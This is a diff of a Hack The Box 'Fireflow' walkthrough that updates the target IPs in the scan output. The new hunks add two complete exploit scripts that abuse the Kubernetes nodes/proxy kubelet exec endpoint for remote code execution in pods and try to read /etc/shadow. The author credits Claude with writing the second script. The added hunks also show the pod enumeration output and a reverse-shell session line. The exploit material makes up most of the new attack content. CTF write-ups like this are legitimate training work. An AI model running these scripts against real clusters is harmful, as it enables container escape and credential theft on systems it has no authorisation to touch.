@@ -8,8 +8,8 @@ Today we'll do the [Fireflow](https://app.hackthebox.com/machines/Fireflow) HTB'
 First of all we need to add the register to `/etc/hosts`:
 
 ```
-$ echo "10.129.94.204 fireflow.htb" | sudo tee -a /etc/hosts
-10.129.94.204 fireflow.htb
+$ echo "10.129.95.159 fireflow.htb" | sudo tee -a /etc/hosts
+10.129.95.159 fireflow.htb
 $
 ```
 
@@ -24,7 +24,7 @@ You can use any port scanner, like [Rustscan](https://github.com/bee-san/RustSca
 First, let's run it and then use Nmap to run default scripts (`-A`, naabu are currently implementing services and versions detection, so if you're reading this, you should check the repository for more information)
 
 ```
-[3,979s][~] ᛋᛋ naabu -host 10.129.94.204 -p -                
+[3,979s][~] ᛋᛋ naabu -host 10.129.95.159 -p -                
 
                   __
   ___  ___  ___ _/ /  __ __
@@ -36,17 +36,17 @@ First, let's run it and then use Nmap to run default scripts (`-A`, naabu are cu
 [INF] Current naabu version 2.6.1 (latest)
 [WRN] UI Dashboard is disabled, Use -dashboard option to enable
 [INF] Running CONNECT scan with non root privileges
-10.129.94.204:22
-10.129.94.204:443
-[INF] Found 2 ports on host 10.129.94.204 (10.129.244.214)
+10.129.95.159:22
+10.129.95.159:443
+[INF] Found 2 ports on host 10.129.95.159 (10.129.244.214)
 ```
 
 Alright, now we can use the nmap default scripts to get banners and others
 
 ```
-[2m14,942s][~] ᛋᛋ sudo nmap -A 10.129.94.204 -p22,443,65535 -T5
+[2m14,942s][~] ᛋᛋ sudo nmap -A 10.129.95.159 -p22,443,65535 -T5
 Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-18 16:40 -0300
-Nmap scan report for fireflow.htb (110.129.94.204)
+Nmap scan report for fireflow.htb (110.129.95.159)
 Host is up (0.17s latency).
 
 PORT      STATE  SERVICE  VERSION
@@ -76,7 +76,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 TRACEROUTE (using port 65535/tcp)
 HOP RTT       ADDRESS
 1   222.76 ms 10.10.14.1
-2   222.83 ms fireflow.htb (10.129.94.204)
+2   222.83 ms fireflow.htb (10.129.95.159)
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 24.57 seconds
@@ -166,8 +166,8 @@ flow                    [Status: 200, Size: 1142, Words: 132, Lines: 25, Duratio
 So we find the flow subdomain, let's add it to our `/etc/hosts`
 
 ```
-[14ms][~/Hacking/CTFs/Fireflow] ᛋᛋ echo "10.129.94.204 flow.fireflow.htb" | sudo tee -a /etc/hosts
-10.129.94.204 flow.fireflow.htb
+[14ms][~/Hacking/CTFs/Fireflow] ᛋᛋ echo "10.129.95.159 flow.fireflow.htb" | sudo tee -a /etc/hosts
+10.129.95.159 flow.fireflow.htb
 [1,463s][~/Hacking/CTFs/Fireflow] ᛋᛋ 
 ```
 
@@ -190,7 +190,7 @@ We discovered a valid subdomain, so we can suppose that some services may respon
 [INF] Running CONNECT scan with non root privileges
 flow.fireflow.htb:22
 flow.fireflow.htb:443
-[INF] Found 2 ports on host flow.fireflow.htb (10.129.94.204)
+[INF] Found 2 ports on host flow.fireflow.htb (10.129.95.159)
 [2m15,336s][~/Hacking/CTFs/Fireflow] ᛋᛋ
 ```
 
@@ -199,9 +199,9 @@ Same ports open, let's check if something changed in nmap default scripts
 ```
 [2m15,336s][~/Hacking/CTFs/Fireflow] ᛋᛋ sudo nmap -A flow.fireflow.htb -p22,443,65535 -T5
 Starting Nmap 7.991 ( https://nmap.org ) at 2026-08-19 16:34 -0300
-Nmap scan report for flow.fireflow.htb (10.129.94.204)
+Nmap scan report for flow.fireflow.htb (10.129.95.159)
 Host is up (0.15s latency).
-rDNS record for 10.129.94.204: fireflow.htb
+rDNS record for 10.129.95.159: fireflow.htb
 
 PORT      STATE  SERVICE   VERSION
 22/tcp    open   ssh       OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
@@ -231,7 +231,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 TRACEROUTE (using port 65535/tcp)
 HOP RTT       ADDRESS
 1   147.17 ms 10.10.14.1
-2   147.47 ms fireflow.htb (10.129.94.204)
+2   147.47 ms fireflow.htb (10.129.95.159)
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 19.31 seconds
@@ -1351,7 +1351,7 @@ So let's run it:
 and (🥁🥁🥁):
 
 ```
-[+] [New Reverse Shell] => mcp-server-54464cb475-29ztf 10.129.94.204 Linux-x86_64 👤 mcp(1000) 😍️ Session ID <2>
+[+] [New Reverse Shell] => mcp-server-54464cb475-29ztf 10.129.95.159 Linux-x86_64 👤 mcp(1000) 😍️ Session ID <2>
 (Penelope)─(Session [1])> 
 ```
 
@@ -1556,7 +1556,7 @@ mcp@mcp-server-54464cb475-29ztf:/app$ curl --cacert "$CA" \
   "serverAddressByClientCIDRs": [
     {
       "clientCIDR": "0.0.0.0/0",
-      "serverAddress": "10.129.94.204:6443"
+      "serverAddress": "10.129.95.159:6443"
     }
   ]
 }
@@ -1991,7 +1991,7 @@ mcp@mcp-server-54464cb475-29ztf:~$ curl --cacert "$CA" \\
   "serverAddressByClientCIDRs": [
     {
       "clientCIDR": "0.0.0.0/0",
-      "serverAddress": "10.129.94.204:6443"
+      "serverAddress": "10.129.95.159:6443"
     }
   ]
 }
@@ -2147,7 +2147,7 @@ mcp@mcp-server-54464cb475-29ztf:/tmp$
 
 And here we go. Now I'll test the [api-only python standalone](https://gist.githubusercontent.com/Yyax13/93fe0b8a2a0c952b990cf96d89bdcff7/raw/db9aa7d11217dbd4e40d8645c80849a6a538117b/kubectl_api_only.py) for an easier interaction:
 
-```
+```bash
 mcp@mcp-server-54464cb475-29ztf:/tmp$ ./kubectl_api_only.py \
   "POST /apis/authorization.k8s.io/v1/selfsubjectrulesreviews" \
   -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview","spec":{"namespace":"default"}}'
@@ -2247,12 +2247,78 @@ And here we go.
 
 ## Exploiting `nodes/proxy` Kubernetes Resource to RCE in any Pod
 
-The `nodes/proxy` resource is well-known for RCE (check https://labs.iximiuz.com/tutorials/nodes-proxy-rce-c9e436a9 and/or https://grahamhelton.com/blog/nodes-proxy-rce for more information). The first thing that I did was executing a PoC for this well-known escape (from https://grahamhelton.com/blog/nodes-proxy-rce#proof-of-concept).
+The `nodes/proxy` resource is well-known for RCE (check https://labs.iximiuz.com/tutorials/nodes-proxy-rce-c9e436a9 and/or https://grahamhelton.com/blog/nodes-proxy-rce for more information). The first thing that I did was executing a PoC for this well-known escape:
+
+```bash
+#!/bin/bash
+
+# Colors
+RED=$(tput setaf 1)
+BLUE=$(tput setaf 4)
+YELLOW=$(tput setaf 3)
+GREEN=$(tput setaf 2)
+ENDCOLOR=$(tput sgr0)
+
+TICK="[${GREEN}+${ENDCOLOR}] "
+TICK_MOVE="[${GREEN}~>${ENDCOLOR}] "
+TICK_BACKUP="[${GREEN}<~${ENDCOLOR}] "
+TICK_INPUT="[${YELLOW}!${ENDCOLOR}] "
+TICK_ERROR="[${RED}!${ENDCOLOR}] "
+
+# Config
+NODE_IP="${NODE_IP:?NODE_IP not set}"
+TOKEN="${TOKEN:?TOKEN not set}"
+NAMESPACE="${NAMESPACE:-default}"
+POD="${POD:-nginx}"
+CONTAINER="${CONTAINER:-nginx}"
+
+exec_cmd() {
+    local cmd="$1"
+    local args=""
+
+    for arg in $cmd; do
+        args+="&command=$arg"
+    done
+
+    args="${args:1}"
+
+    timeout 3 websocat --insecure -E \
+        --header "Authorization: Bearer $TOKEN" \
+        --protocol v4.channel.k8s.io \
+        "wss://$NODE_IP:10250/exec/$NAMESPACE/$POD/$CONTAINER?output=1&error=1&$args" 2>/dev/null \
+        | grep -v '{"metadata":{}'
+}
+
+echo ""
+echo "${TICK}Target: ${YELLOW}$NODE_IP:10250${ENDCOLOR}"
+echo "${TICK}Pod: ${YELLOW}$NAMESPACE/$POD${ENDCOLOR}"
+echo ""
+
+echo "${TICK_MOVE}Fetching hostname..."
+hostname=$(exec_cmd "cat /etc/hostname" | tr -d '\n\r')
+echo "${TICK}Hostname: ${GREEN}$hostname${ENDCOLOR}"
+
+echo ""
+echo "${TICK_MOVE}Fetching identity..."
+identity=$(exec_cmd "id")
+echo "${TICK}Identity: ${GREEN}$identity${ENDCOLOR}"
+
+echo ""
+echo "${TICK_MOVE}Attempting to read /etc/shadow..."
+shadow=$(exec_cmd "cat /etc/shadow")
+
+if [[ -n "$shadow" ]]; then
+    echo "${TICK}${RED}Successfully read /etc/shadow:${ENDCOLOR}"
+    echo "$shadow"
+else
+    echo "${TICK_ERROR}Could not read /etc/shadow"
+fi
+```
 
 I needed a `NODE_IP` environment variable (which is probably the host IP), so I set it:
 
 ```
-mcp@mcp-server-54464cb475-29ztf:/tmp$ export NODE_IP="10.129.94.204"
+mcp@mcp-server-54464cb475-29ztf:/tmp$ export NODE_IP="10.129.95.159"
 mcp@mcp-server-54464cb475-29ztf:/tmp$ 
 ```
 
@@ -2261,7 +2327,7 @@ After this I just executed the file:
 ```
 mcp@mcp-server-54464cb475-29ztf:/tmp$ ./escape.sh 
 
-[+] Target: 10.129.94.204:10250
+[+] Target: 10.129.95.159:10250
 [+] Pod: default/nginx
 
 [~>] Fetching hostname...
@@ -2275,6 +2341,287 @@ mcp@mcp-server-54464cb475-29ztf:/tmp$ ./escape.sh
 mcp@mcp-server-54464cb475-29ztf:/tmp$ 
 ```
 
+
+My hypothesis is that I probably need a valid pod (I don't know if `default/nginx` really exists).
+
+## Looking for a Valid Pod
+
+Firstly I just ran the `kubectl` py abstraction against the endpoint `GET /api/v1/nodes/fireflow/proxy/pods` (fireflow is the hostname, why not trying it):
+
+```
+mcp@mcp-server-54464cb475-29ztf:/tmp$ ./kubectl_api_only.py "GET /api/v1/nodes/fireflow/proxy/pods"
+HTTP 200
+{
+  "kind": "PodList",
+  "apiVersion": "v1",
+  "metadata": {},
+  "items": [
+    {
+      "metadata": {
+        "name": "local-path-provisioner-8686667995-lp9th",
+        "generateName": "local-path-provisioner-8686667995-",
+        "namespace": "kube-system",
+
+<--- ENORMOUS RESPONSE (flooded my terminal) --->
+
+        ],
+        "qosClass": "Guaranteed"
+      }
+    }
+  ]
+}
+mcp@mcp-server-54464cb475-29ztf:/tmp$
+```
+
+And what a big response, I needed to run again with a json parser (as `jq` wasn't in the machine):
+
+```bash
+mcp@mcp-server-54464cb475-29ztf:/tmp$ ./kubectl_api_only.py "GET /api/v1/nodes/fireflow/proxy/pods" | python3 -m json.tool | grep -E '"name"|"namespace"' | head -50
+HTTP 200
+"name": "mcp-server-54464cb475-29ztf",
+"namespace": "default",
+"name": "mcp-server-54464cb475",
+"name": "kube-api-access-9kl68",
+"name": "kube-root-ca.crt",
+"path": "namespace",
+"name": "mcp-server",
+"name": "kube-api-access-9kl68",
+"name": "mcp-server",
+"name": "kube-api-access-9kl68",
+"name": "prometheus-prometheus-node-exporter-nmntq",
+"namespace": "monitoring",
+"name": "prometheus-prometheus-node-exporter",
+"name": "proc",
+"name": "sys",
+"name": "root",
+"name": "node-exporter",
+"name": "metrics",
+"name": "HOST_IP",
+"name": "proc",
+"name": "sys",
+"name": "root",
+"name": "node-exporter",
+"name": "proc",
+"name": "sys",
+"name": "root",
+"name": "coredns-76c974cb66-cn7l6",
+"namespace": "kube-system",
+"name": "coredns-76c974cb66",
+"name": "config-volume",
+"name": "coredns",
+"name": "custom-config-volume",
+"name": "coredns-custom",
+"name": "kube-api-access-7dzhj",
+"name": "kube-root-ca.crt",
+"path": "namespace",
+"name": "coredns",
+"name": "dns",
+"name": "dns-tcp",
+"name": "metrics",
+"name": "config-volume",
+"name": "custom-config-volume",
+"name": "kube-api-access-7dzhj",
+"name": "coredns",
+"name": "config-volume",
+"name": "custom-config-volume",
+"name": "kube-api-access-7dzhj",
+"name": "local-path-provisioner-8686667995-lp9th",
+"namespace": "kube-system",
+"name": "local-path-provisioner-8686667995",
+grep: write error: Broken pipe
+mcp@mcp-server-54464cb475-29ztf:/tmp$ 
+```
+
+Yes, I just pasted a formatted output here, so you all can't see visually the relations with white spaces, so I ran this new command:
+
+```
+mcp@mcp-server-54464cb475-29ztf:/tmp$ ./kubectl_api_only.py "GET /api/v1/nodes/fireflow/proxy/pods" | python3 -m json.tool | grep "prometheus-prometheus-node-exporter-nmntq" -B 3 -A 570| grep -E '"name"|"namespace"'
+HTTP 200
+                "name": "prometheus-prometheus-node-exporter-nmntq",
+                "namespace": "monitoring",
+                        "name": "prometheus-prometheus-node-exporter",
+                        "name": "proc",
+                        "name": "sys",
+                        "name": "root",
+                        "name": "node-exporter",
+                                "name": "metrics",
+                                "name": "HOST_IP",
+                                "name": "proc",
+                                "name": "sys",
+                                "name": "root",
+                        "name": "node-exporter",
+                                "name": "proc",
+                                "name": "sys",
+                                "name": "root",
+mcp@mcp-server-54464cb475-29ztf:/tmp$ 
+```
+
+Apparently the `prometheus-prometheus-node-exporter` pod runs directly into system, mounted at host's filesystem (it's already using the `HOST_IP`, so why not?!). I'll just set the `POD` environment variable so the `escape.sh` will correcly run the PoC against it:
+
+```
+mcp@mcp-server-54464cb475-29ztf:/tmp$ export POD=prometheus-prometheus-node-exporter-nmntq
+mcp@mcp-server-54464cb475-29ztf:/tmp$ echo $POD
+prometheus-prometheus-node-exporter-nmntq
+mcp@mcp-server-54464cb475-29ztf:/tmp$ ./escape.sh 
+
+[+] Target: 10.129.95.159:10250
+[+] Pod: default/prometheus-prometheus-node-exporter-nmntq
+
+[~>] Fetching hostname...
+[+] Hostname: 
+
+[~>] Fetching identity...
+[+] Identity: 
+
+[~>] Attempting to read /etc/shadow...
+[!] Could not read /etc/shadow
+mcp@mcp-server-54464cb475-29ztf:/tmp$ 
+```
+
+This happened because the `.sh` uses the `websocat` utility, so I asked claude for a new PoC that uses python3 websocket module, and he gave me this:
+
+```bash
+#!/bin/bash
+
+# Colors
+RED=$(tput setaf 1)
+BLUE=$(tput setaf 4)
+YELLOW=$(tput setaf 3)
+GREEN=$(tput setaf 2)
+ENDCOLOR=$(tput sgr0)
+
+TICK="[${GREEN}+${ENDCOLOR}] "
+TICK_MOVE="[${GREEN}~>${ENDCOLOR}] "
+TICK_BACKUP="[${GREEN}<~${ENDCOLOR}] "
+TICK_INPUT="[${YELLOW}!${ENDCOLOR}] "
+TICK_ERROR="[${RED}!${ENDCOLOR}] "
+
+# Config
+NODE_IP="${NODE_IP:?NODE_IP not set}"
+TOKEN="${TOKEN:?TOKEN not set}"
+NAMESPACE="${NAMESPACE:-default}"
+POD="${POD:-nginx}"
+CONTAINER="${CONTAINER:-nginx}"
+
+exec_cmd() {
+  python3 - \
+    "$NODE_IP" \
+    "$TOKEN" \
+    "$NAMESPACE" \
+    "$POD" \
+    "$CONTAINER" \
+    "$1" <<'PY'
+import sys
+import ssl
+import shlex
+import asyncio
+from urllib.parse import urlencode
+
+import websockets
+
+
+async def main():
+    node_ip, token, namespace, pod, container, command = sys.argv[1:]
+
+    args = shlex.split(command)
+
+    params = [
+        ("output", "1"),
+        ("error", "1"),
+    ]
+
+    for arg in args:
+        params.append(("command", arg))
+
+    url = (
+        f"wss://{node_ip}:10250"
+        f"/exec/{namespace}/{pod}/{container}?"
+        + urlencode(params)
+    )
+
+    ssl_context = ssl.create_default_context()
+    ssl_context.check_hostname = False
+    ssl_context.verify_mode = ssl.CERT_NONE
+
+    headers = {
+        "Authorization": f"Bearer {token}"
+    }
+
+    try:
+        async with websockets.connect(
+            url,
+            additional_headers=headers,
+            subprotocols=["v4.channel.k8s.io"],
+            ssl=ssl_context,
+            open_timeout=3,
+            close_timeout=1,
+        ) as ws:
+
+            async for data in ws:
+                if isinstance(data, bytes):
+                    if not data:
+                        continue
+
+                    channel = data[0]
+                    payload = data[1:]
+
+                    # stdout + stderr
+                    if channel in (1, 2):
+                        sys.stdout.buffer.write(payload)
+                        sys.stdout.buffer.flush()
+
+                elif isinstance(data, str) and len(data) > 1:
+                    channel = ord(data[0])
+
+                    if channel in (1, 2):
+                        print(data[1:], end="")
+
+    except Exception as e:
+        print(f"[!] WebSocket error: {e}", file=sys.stderr)
+
+
+asyncio.run(main())
+PY
+}
+
+echo ""
+echo "${TICK}Target: ${YELLOW}$NODE_IP:10250${ENDCOLOR}"
+echo "${TICK}Pod: ${YELLOW}$NAMESPACE/$POD${ENDCOLOR}"
+echo ""
+
+echo "${TICK_MOVE}Fetching hostname..."
+
+hostname=$(exec_cmd "cat /etc/hostname" | tr -d '\n\r')
+
+if [[ -n "$hostname" ]]; then
+  echo "${TICK}Hostname: ${GREEN}$hostname${ENDCOLOR}"
+else
+  echo "${TICK_ERROR}Could not fetch hostname"
+fi
+
+echo ""
+echo "${TICK_MOVE}Fetching identity..."
+
+identity=$(exec_cmd "id")
+
+if [[ -n "$identity" ]]; then
+  echo "${TICK}Identity: ${GREEN}$identity${ENDCOLOR}"
+else
+  echo "${TICK_ERROR}Could not fetch identity"
+fi
+
+echo ""
+echo "${TICK_MOVE}Attempting to read /etc/shadow..."
+
+shadow=$(exec_cmd "cat /etc/shadow")
+
+if [[ -n "$shadow" ]]; then
+  echo "${TICK}${RED}Successfully read /etc/shadow:${ENDCOLOR}"
+  echo "$shadow"
+else
+  echo "${TICK_ERROR}Could not read /etc/shadow"
+fi
+```
 
 
 
